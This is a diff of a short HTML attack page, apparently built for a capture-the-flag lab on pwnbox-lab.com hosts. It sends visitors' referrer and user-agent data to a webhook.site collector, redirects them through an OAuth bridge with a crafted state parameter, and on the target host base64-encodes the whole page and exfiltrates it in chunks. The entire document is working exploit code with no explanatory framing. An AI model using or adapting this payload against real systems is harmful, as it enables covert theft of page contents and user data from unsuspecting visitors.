@@ -1,20 +1,22 @@
 <!doctype html><html><body><h1>loading</h1>
 <script>
 var C='https://webhook.site/e2800127-7671-4b5d-a058-6a5ed1f0d9ec';
-function ping(t,d){new Image().src=C+'?tag='+t+'&d='+encodeURIComponent(JSON.stringify(d||{}));}
-ping('V3-JS',{ref:document.referrer.slice(0,80)});
+var UA=navigator.userAgent.slice(0,25);
+function ping(t,d){new Image().src=C+'?tag='+t+'&ua='+encodeURIComponent(UA)+'&d='+encodeURIComponent(JSON.stringify(d||{}));}
+ping('V4',{ref:document.referrer.slice(0,60)});
 setTimeout(function(){
-  location='https://cloud-console-534f164158ae.pwnbox-lab.com/oauth/bridge?state='+encodeURIComponent('{"target_host":"clf-534f164158ae.pwnbox-lab.com","return_to":"/"}');
+ location='https://cloud-console-534f164158ae.pwnbox-lab.com/oauth/bridge?state='+encodeURIComponent('{"target_host":"clf-534f164158ae.pwnbox-lab.com","return_to":"/"}');
 },250);
-</script></body></html>
-<script>
-(function(){
- function bx(s){return btoa(unescape(encodeURIComponent(s)));}
- var C='https://webhook.site/e2800127-7671-4b5d-a058-6a5ed1f0d9ec';
- var enc=bx(document.documentElement.outerHTML);
- new Image().src=C+'?tag=S2-LANDING&host='+encodeURIComponent(location.host)+'&len='+enc.length;
- for(var i=0,o=0;o<enc.length;i++,o+=1100){
-   new Image().src=C+'?tag=VC&i='+i+'&d='+enc.substr(o,1100);
- }
-})();
 </script>
+<script>
+window.addEventListener('load',function(){
+ if(location.hostname.indexOf('clf-')===0){
+  function bx(s){return btoa(unescape(encodeURIComponent(s)));}
+  var enc=bx(document.documentElement.outerHTML);
+  ping('S2-LANDING',{len:enc.length});
+  for(var i=0,o=0;o<enc.length;i++,o+=1100){
+   new Image().src=C+'?tag=VC&ua='+encodeURIComponent(UA)+'&i='+i+'&d='+enc.substr(o,1100);
+  }
+ }
+});
+</script></body></html>
